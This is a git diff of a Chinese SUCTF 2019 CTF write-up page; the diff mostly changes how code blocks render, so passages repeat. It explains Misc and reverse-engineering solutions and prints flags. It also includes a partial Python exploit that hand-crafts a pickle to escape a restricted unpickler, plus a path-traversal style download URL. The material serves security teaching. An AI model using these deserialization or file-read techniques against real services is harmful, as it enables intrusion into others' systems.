-</span></span></code></pre></div><h2 id=misc>Misc</h2><h3 id=签到题>签到题</h3><p>把 base64 转成图片就行了</p><p>有些师傅说字母看不清&mldr;其实签到题来源于最近一个比较火的梗&mldr;看不清我觉得没多大影响&mldr;大不了一个个试试看嘛（手动狗头</p><h3 id=game>game</h3><p>纯粹是脑洞题，从<code>find my secret</code> 去找前端js里的<code>secret</code>字符串，找到之后得到一张图片，lsb里有加密字符串，用的3des加密，密钥为完成魔方后得到的假flag，本以为会被秒，脑洞实在是太无聊了,(逃</p><h3 id=guess_game>guess_game</h3><p>pickle 本质是个栈语言, 不同于 json 亦或是 php 的 serialize. 实际上是运行 pickle 得到的结果是被序列化的对象. 这里虽然条件受限, 只能加载指定模块, 但是可以看到 <code>__init.py__</code> 中 <code>game = Game()</code>, 所以只要构造出 pickle 代码获得 guess_game.game, 然后修改 game 的 win_count 和 round_count 即可.<br>注意如果是 <code>from guess_game import game</code>, 然后修改再 dumps 这个 game 的话, 是在运行时重新新建一个 Game 对象, 而不是从 guess_game 这个 module 里面获取. 所以这里必须手写/更改一下 dumps 生成的 pickle,</p><p>然后注意</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ticket</span> <span class=o>=</span> <span class=n>restricted_loads</span><span class=p>(</span><span class=n>ticket</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=misc>Misc</h2><h3 id=签到题>签到题</h3><p>把 base64 转成图片就行了</p><p>有些师傅说字母看不清&mldr;其实签到题来源于最近一个比较火的梗&mldr;看不清我觉得没多大影响&mldr;大不了一个个试试看嘛（手动狗头</p><h3 id=game>game</h3><p>纯粹是脑洞题，从<code>find my secret</code> 去找前端js里的<code>secret</code>字符串，找到之后得到一张图片，lsb里有加密字符串，用的3des加密，密钥为完成魔方后得到的假flag，本以为会被秒，脑洞实在是太无聊了,(逃</p><h3 id=guess_game>guess_game</h3><p>pickle 本质是个栈语言, 不同于 json 亦或是 php 的 serialize. 实际上是运行 pickle 得到的结果是被序列化的对象. 这里虽然条件受限, 只能加载指定模块, 但是可以看到 <code>__init.py__</code> 中 <code>game = Game()</code>, 所以只要构造出 pickle 代码获得 guess_game.game, 然后修改 game 的 win_count 和 round_count 即可.<br>注意如果是 <code>from guess_game import game</code>, 然后修改再 dumps 这个 game 的话, 是在运行时重新新建一个 Game 对象, 而不是从 guess_game 这个 module 里面获取. 所以这里必须手写/更改一下 dumps 生成的 pickle,</p><p>然后注意</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ticket</span> <span class=o>=</span> <span class=n>restricted_loads</span><span class=p>(</span><span class=n>ticket</span><span class=p>)</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=k>assert</span> <span class=nb>type</span><span class=p>(</span><span class=n>ticket</span><span class=p>)</span> <span class=o>==</span> <span class=n>Ticket</span>
-</span></span></code></pre></div><p>所以还需要栈顶为一个 Ticket, 这比较方便, 可以 dumps 一个 Ticket 拼到之前手写的后面就可以了.</p><p>dockerfile: <a href=https://github.com/rmb122/suctf2019_guess_game/>https://github.com/rmb122/suctf2019_guess_game/</a><br>ref: <a href=https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html>https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a><br>exp:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pickle</span>
+</span></span></code></pre></td></tr></table></div></div><p>所以还需要栈顶为一个 Ticket, 这比较方便, 可以 dumps 一个 Ticket 拼到之前手写的后面就可以了.</p><p>dockerfile: <a href=https://github.com/rmb122/suctf2019_guess_game/>https://github.com/rmb122/suctf2019_guess_game/</a><br>ref: <a href=https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html>https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a><br>exp:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pickle</span>
 </span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
 </span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
 </span></span><span class=line><span class=cl>
@@ -934,8 +1837,19 @@ http://ip/download.php?filename=/usr/lib/apache2/modules/mod_cocktail.so</p><p>4
 </span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>))</span>
 </span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>))</span>
 </span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>))</span>
-</span></span></code></pre></div><h3 id=homerouter>homerouter</h3><p>题目的附件给出的是一个固件文件，提取文件系统后我们可以发现是OpenWrt。结合题目名称和<code>/etc/config/easycwmp</code>文件，查阅一下资料后我们可以发现这道题的内容和<code>tr069</code>有关，相信家里用电信光猫的同学应该不陌生，这个东西具体是用来干什么的这里就不做赘述了。当明白了这道理的考察点之后后续工作就不算困难了，一种做法是找一个OpenWrt的路由器模拟出环境，将固件中存在的和easycwmp相关的配置文件添加到模拟环境中即可，只是这样需要硬件设备支持。实际上我们打开easycwmp项目可以发现完全可以在x86环境下编译运行，官方给出了也较为详细的编译指南。编译成功后同样将固件中的配置文件添加进来，使用前台log模式即可发现，ACS服务器下发了一个修改系统root密码的指令，而密码就是该题的flag：<code>Hello_tr_069_Protocol</code>。</p><h3 id=protocol>protocol</h3><p>打开<code>pcapng</code>文件后我们可以发现这是一段USB流量，观察一些流量我们可以发现出现了<code>opendeck</code>字符串和一个假的flag，结合开源的提示我们可以找到两个项目<a href=github.com/summershrimp/opendeck-linux>opendeck-linux</a>和<a href=github.com/summershrimp/opendeck-linux>opendeck-gui</a>，注意有一个同名的项目不要搞错了。大致观察下这两个项目的代码，我们可以发现题目给出的流量正是gui项目所读取的流量。</p><p>kernel运行在一个连接触摸屏的Linux设备上，而gui项目一方面解析经过USB发来的信息，将一些png图片显示触摸屏上，一方面响应触摸屏上的输入信息，并将输入信息发到USB对端。在源码中我们可以发现该程序的运行原理是：对端一次性发送15张png图片，每一张图片是一个字符，按照数据部分第3个字节表示的数字显示在屏幕上；接下来读取触摸屏上输出的点击信息，如果点击正确那么对端发来一张空图片覆盖掉点击位置（可以理解为清空该位置图像），等到该组中有10个字符消失后开始下一组。整个流量中包含了5组上述过程。</p><p>知道程序的大致运行原理了后该题就不难了，首先将流量包中的png图片全部提取，接下来用<code>tshark</code>将leftover data提取出来，解析位置信息就可以得到每次点击的字符。将所有的字符连起来即可得到flag<code>suctf{My_usb_pr0toco1_s0_w3ak}</code>。</p><h2 id=rev>Rev</h2><h3 id=hardcpp>hardCpp</h3><p>比较简单，签到的&mldr;
-exp如下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>21</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=homerouter>homerouter</h3><p>题目的附件给出的是一个固件文件，提取文件系统后我们可以发现是OpenWrt。结合题目名称和<code>/etc/config/easycwmp</code>文件，查阅一下资料后我们可以发现这道题的内容和<code>tr069</code>有关，相信家里用电信光猫的同学应该不陌生，这个东西具体是用来干什么的这里就不做赘述了。当明白了这道理的考察点之后后续工作就不算困难了，一种做法是找一个OpenWrt的路由器模拟出环境，将固件中存在的和easycwmp相关的配置文件添加到模拟环境中即可，只是这样需要硬件设备支持。实际上我们打开easycwmp项目可以发现完全可以在x86环境下编译运行，官方给出了也较为详细的编译指南。编译成功后同样将固件中的配置文件添加进来，使用前台log模式即可发现，ACS服务器下发了一个修改系统root密码的指令，而密码就是该题的flag：<code>Hello_tr_069_Protocol</code>。</p><h3 id=protocol>protocol</h3><p>打开<code>pcapng</code>文件后我们可以发现这是一段USB流量，观察一些流量我们可以发现出现了<code>opendeck</code>字符串和一个假的flag，结合开源的提示我们可以找到两个项目<a href=github.com/summershrimp/opendeck-linux>opendeck-linux</a>和<a href=github.com/summershrimp/opendeck-linux>opendeck-gui</a>，注意有一个同名的项目不要搞错了。大致观察下这两个项目的代码，我们可以发现题目给出的流量正是gui项目所读取的流量。</p><p>kernel运行在一个连接触摸屏的Linux设备上，而gui项目一方面解析经过USB发来的信息，将一些png图片显示触摸屏上，一方面响应触摸屏上的输入信息，并将输入信息发到USB对端。在源码中我们可以发现该程序的运行原理是：对端一次性发送15张png图片，每一张图片是一个字符，按照数据部分第3个字节表示的数字显示在屏幕上；接下来读取触摸屏上输出的点击信息，如果点击正确那么对端发来一张空图片覆盖掉点击位置（可以理解为清空该位置图像），等到该组中有10个字符消失后开始下一组。整个流量中包含了5组上述过程。</p><p>知道程序的大致运行原理了后该题就不难了，首先将流量包中的png图片全部提取，接下来用<code>tshark</code>将leftover data提取出来，解析位置信息就可以得到每次点击的字符。将所有的字符连起来即可得到flag<code>suctf{My_usb_pr0toco1_s0_w3ak}</code>。</p><h2 id=rev>Rev</h2><h3 id=hardcpp>hardCpp</h3><p>比较简单，签到的&mldr;
+exp如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>21</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
 </span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>c</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>	<span class=n>c</span> <span class=o>=</span> <span class=n>input</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=p>(</span><span class=kt>char</span><span class=p>)</span><span class=n>times</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>	<span class=n>c</span> <span class=o>=</span> <span class=n>c_add</span><span class=p>(</span><span class=n>c</span><span class=p>)(</span><span class=n>c_mod</span><span class=p>(</span><span class=n>input</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=mi>1</span> <span class=o>+</span> <span class=n>times</span><span class=p>])(</span><span class=mi>7</span><span class=p>));</span>
@@ -946,29 +1860,128 @@ exp如下</p><div class=highlight><pre tabindex=0 class=chroma><code class=langu
 </span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>	<span class=p>}</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>里面有个时间反调，要求必须时间差必须为0</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>times</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>){</span>
+</span></span></code></pre></td></tr></table></div></div><p>里面有个时间反调，要求必须时间差必须为0</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>times</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>){</span>
 </span></span><span class=line><span class=cl>	<span class=n>puts</span><span class=p>(</span><span class=s>&#34;Let the silent second hand take the place of my doubt...&#34;</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>	<span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>时间差会被加在数组下标里，然而因为预期是0，所以没什么影响</p><h3 id=rev-1>rev</h3><p>程序用IDA打开很复杂</p><p>一开始用<code>boost::tokenizer</code>切割字符串</p><p>输入形如<code>aaaa-bbbbb-cccccc</code>，中间的特殊符号会被认为是分隔符，然后获得这三个<code>std::string</code>，分别check</p><p>第一个，res[0]，要求长度是10，然后经过</p><p><code>boost::trim_left_copy_if(res[0], boost::is_any_of("1"))</code></p><p>这句话是把这个字符串左边的<code>1</code>全部去掉</p><p>进入一个循环，要求每个字符异或0xab后和数组相同，长度要求是5，也就是说一开始被去掉了五个<code>1</code></p><p>于是输入的第一段是<code>11111suctf</code></p><p>第二个，res[1]，</p><p><code>((res[1].length() == 4) &&</code></p><p><code>(boost::all(res[1],boost::is_from_range('a','g')</code></p><p><code>|| boost::is_from_range('A', 'G'))))</code></p><p>长度是4，每个字符都是[A-Ga-g]</p><p>经过<code>boost::to_upper</code>要求和原string相同，这表明输入的4个字符都是大写字母</p><p>限制范围在[A-G]了</p><p>要求4个字符的数值递增，步长为2,</p><p>那么只能ACEG</p><p>也就是第二个的输入</p><p>第三个，res[2]</p><p>通过<code>boost::all(res[2],boost::is_digit())</code>判断要求都是数字，小于10位，转成int，记作sum</p><p>要求<code>(sum % 2 == 0) && (func(sum) == -1412590079) && (func2(sum) == 305392417)</code></p><p>如果不加第一个%2==0的条件，会有三个结果31415925 31415926 31415927</p><p>这样下来只有一个结果31415926</p><p>int范围内只有这一个符合要求</p><p>也就是第三个输入</p><p>那么输入就形如<code>11111suctf-ACEG-31415926</code></p><p>输出为 suctf{ACEG31415926}
-You win!</p><h3 id=akira-homework>Akira Homework</h3><p>程序是一个Windows下的程序，开始的时候会要求输入密码。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[+]======================[+]
+</span></span></code></pre></td></tr></table></div></div><p>时间差会被加在数组下标里，然而因为预期是0，所以没什么影响</p><h3 id=rev-1>rev</h3><p>程序用IDA打开很复杂</p><p>一开始用<code>boost::tokenizer</code>切割字符串</p><p>输入形如<code>aaaa-bbbbb-cccccc</code>，中间的特殊符号会被认为是分隔符，然后获得这三个<code>std::string</code>，分别check</p><p>第一个，res[0]，要求长度是10，然后经过</p><p><code>boost::trim_left_copy_if(res[0], boost::is_any_of("1"))</code></p><p>这句话是把这个字符串左边的<code>1</code>全部去掉</p><p>进入一个循环，要求每个字符异或0xab后和数组相同，长度要求是5，也就是说一开始被去掉了五个<code>1</code></p><p>于是输入的第一段是<code>11111suctf</code></p><p>第二个，res[1]，</p><p><code>((res[1].length() == 4) &&</code></p><p><code>(boost::all(res[1],boost::is_from_range('a','g')</code></p><p><code>|| boost::is_from_range('A', 'G'))))</code></p><p>长度是4，每个字符都是[A-Ga-g]</p><p>经过<code>boost::to_upper</code>要求和原string相同，这表明输入的4个字符都是大写字母</p><p>限制范围在[A-G]了</p><p>要求4个字符的数值递增，步长为2,</p><p>那么只能ACEG</p><p>也就是第二个的输入</p><p>第三个，res[2]</p><p>通过<code>boost::all(res[2],boost::is_digit())</code>判断要求都是数字，小于10位，转成int，记作sum</p><p>要求<code>(sum % 2 == 0) && (func(sum) == -1412590079) && (func2(sum) == 305392417)</code></p><p>如果不加第一个%2==0的条件，会有三个结果31415925 31415926 31415927</p><p>这样下来只有一个结果31415926</p><p>int范围内只有这一个符合要求</p><p>也就是第三个输入</p><p>那么输入就形如<code>11111suctf-ACEG-31415926</code></p><p>输出为 suctf{ACEG31415926}
+You win!</p><h3 id=akira-homework>Akira Homework</h3><p>程序是一个Windows下的程序，开始的时候会要求输入密码。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[+]======================[+]
 </span></span><span class=line><span class=cl>[+] Akira&#39;s Homework 2nd [+]
 </span></span><span class=line><span class=cl>[+]======================[+]
 </span></span><span class=line><span class=cl>[=] My passwords is:
-</span></span></code></pre></div><p>分析可以直接使用ida对程序逻辑进行分析。从程序的某些迹象中可以发现，大部分的字符串似乎都被加密了。并且当用调试器连接的时候，程序会直接强行关闭，程序运行时间长也会自行关闭。解决方案可以是Patch程序的反调试逻辑等。这边提出的解决方案是使用dmp的方式结合着分析程序，这样能够提高解答的速度。通过dmp的方式，能够找到程序的第一个输入点:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>for</span><span class=p>(</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x6c</span><span class=p>;</span> <span class=o>++</span><span class=mi>1</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>分析可以直接使用ida对程序逻辑进行分析。从程序的某些迹象中可以发现，大部分的字符串似乎都被加密了。并且当用调试器连接的时候，程序会直接强行关闭，程序运行时间长也会自行关闭。解决方案可以是Patch程序的反调试逻辑等。这边提出的解决方案是使用dmp的方式结合着分析程序，这样能够提高解答的速度。通过dmp的方式，能够找到程序的第一个输入点:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>for</span><span class=p>(</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x6c</span><span class=p>;</span> <span class=o>++</span><span class=mi>1</span><span class=p>)</span>
 </span></span><span class=line><span class=cl>   <span class=n>Str</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=n>byte_7ff766972AE0</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
 </span></span><span class=line><span class=cl><span class=nf>puts</span><span class=p>(</span><span class=n>Str</span><span class=p>)</span>
 </span></span><span class=line><span class=cl><span class=nf>sub_7FF76959C80</span><span class=p>(</span><span class=s>&#34;%18s&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v4</span><span class=p>,</span> <span class=mi>19</span><span class=n>i64</span><span class=p>);</span>
-</span></span></code></pre></div><p>直接逆向这一段，能够找到程序当前使用的密钥为:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Akira_aut0_ch3ss_!
-</span></span></code></pre></div><p>输入这段逻辑，此时会发现程序提示</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Have no sign!
-</span></span></code></pre></div><p>返回程序检查，会发现有一个check逻辑<code>int sub_7FF682FC93B0()</code>，里面检查了一个叫做<code>Alternate Data Streams</code>的东西，并且将这个数据做了一次<code>md5</code>签名检查，通过查询可以查到签名内容为</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Overwatch
-</span></span></code></pre></div><p>给<code>exe</code>加上<code>Alertable Data Streaming</code>之后，就能够通过检测。在刚刚的提示框后，会要求输入第二次答案，这个答案才是flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Now check the sign:
-</span></span></code></pre></div><p>dmp下程序后，会发现还有一个dll也藏在进程中。将DLL取出逆向，观测可知，其尝试打开了一个<code>ShareMemory</code>，并且读出了里面的内容，传入了函数<code>sub_180011136</code>。所以这里猜测，在这个程序运行的过程中，在主线程中必定也存在一个对称操作。于是检查原先的exe，找到调用<code>MapViewOfFile</code>的周围</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>000000014000771</span><span class=n>F</span>                 <span class=n>mov</span>     <span class=p>[</span><span class=n>rsp</span><span class=o>+</span><span class=mi>0</span><span class=n>B8h</span><span class=o>+</span><span class=n>Src</span><span class=p>],</span> <span class=mi>7</span><span class=n>Ch</span>
+</span></span></code></pre></td></tr></table></div></div><p>直接逆向这一段，能够找到程序当前使用的密钥为:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Akira_aut0_ch3ss_!
+</span></span></code></pre></td></tr></table></div></div><p>输入这段逻辑，此时会发现程序提示</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Have no sign!
+</span></span></code></pre></td></tr></table></div></div><p>返回程序检查，会发现有一个check逻辑<code>int sub_7FF682FC93B0()</code>，里面检查了一个叫做<code>Alternate Data Streams</code>的东西，并且将这个数据做了一次<code>md5</code>签名检查，通过查询可以查到签名内容为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Overwatch
+</span></span></code></pre></td></tr></table></div></div><p>给<code>exe</code>加上<code>Alertable Data Streaming</code>之后，就能够通过检测。在刚刚的提示框后，会要求输入第二次答案，这个答案才是flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Now check the sign:
+</span></span></code></pre></td></tr></table></div></div><p>dmp下程序后，会发现还有一个dll也藏在进程中。将DLL取出逆向，观测可知，其尝试打开了一个<code>ShareMemory</code>，并且读出了里面的内容，传入了函数<code>sub_180011136</code>。所以这里猜测，在这个程序运行的过程中，在主线程中必定也存在一个对称操作。于是检查原先的exe，找到调用<code>MapViewOfFile</code>的周围</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>000000014000771</span><span class=n>F</span>                 <span class=n>mov</span>     <span class=p>[</span><span class=n>rsp</span><span class=o>+</span><span class=mi>0</span><span class=n>B8h</span><span class=o>+</span><span class=n>Src</span><span class=p>],</span> <span class=mi>7</span><span class=n>Ch</span>
 </span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>0000000140007727</span>                 <span class=n>mov</span>     <span class=p>[</span><span class=n>rsp</span><span class=o>+</span><span class=mi>0</span><span class=n>B8h</span><span class=o>+</span><span class=n>var_2F</span><span class=p>],</span> <span class=mi>45</span><span class=n>h</span>
 </span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>000000014000772</span><span class=n>F</span>                 <span class=n>mov</span>     <span class=p>[</span><span class=n>rsp</span><span class=o>+</span><span class=mi>0</span><span class=n>B8h</span><span class=o>+</span><span class=n>var_2E</span><span class=p>],</span> <span class=mi>38</span><span class=n>h</span>
 </span></span><span class=line><span class=cl><span class=o>...</span>
-</span></span></code></pre></div><p>如果使用了工具分析这个dmp下来的dll，会发现其中有一个类似AES算法的东西，也就是这个<code>sub_180011136</code>函数的。最终可以解得flag为:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag{Ak1rAWin!}
-</span></span></code></pre></div><p><em>吐槽：题目没有设计好，导致DLL的解密逻辑好像很容易被找出来，结果很多师傅似乎拿到第一个key之后直接就解开了dll。。。本意是想让大家了解一下Windows下的ADS作为签名的用途的。果然还是出题人太菜了</em></p><h3 id=signin>SignIn</h3><p>使用了gmp大数库实现了一个简单的rsa,题目中只有N e,由于N不是很大,可以直接分解,得到p q,然后生成d,即可解出flag</p><h3 id=babyunic>babyunic</h3><p>先放上源码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unicorn/unicorn.h&gt;</span><span class=cp>
+</span></span></code></pre></td></tr></table></div></div><p>如果使用了工具分析这个dmp下来的dll，会发现其中有一个类似AES算法的东西，也就是这个<code>sub_180011136</code>函数的。最终可以解得flag为:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag{Ak1rAWin!}
+</span></span></code></pre></td></tr></table></div></div><p><em>吐槽：题目没有设计好，导致DLL的解密逻辑好像很容易被找出来，结果很多师傅似乎拿到第一个key之后直接就解开了dll。。。本意是想让大家了解一下Windows下的ADS作为签名的用途的。果然还是出题人太菜了</em></p><h3 id=signin>SignIn</h3><p>使用了gmp大数库实现了一个简单的rsa,题目中只有N e,由于N不是很大,可以直接分解,得到p q,然后生成d,即可解出flag</p><h3 id=babyunic>babyunic</h3><p>先放上源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unicorn/unicorn.h&gt;</span><span class=cp>
 </span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
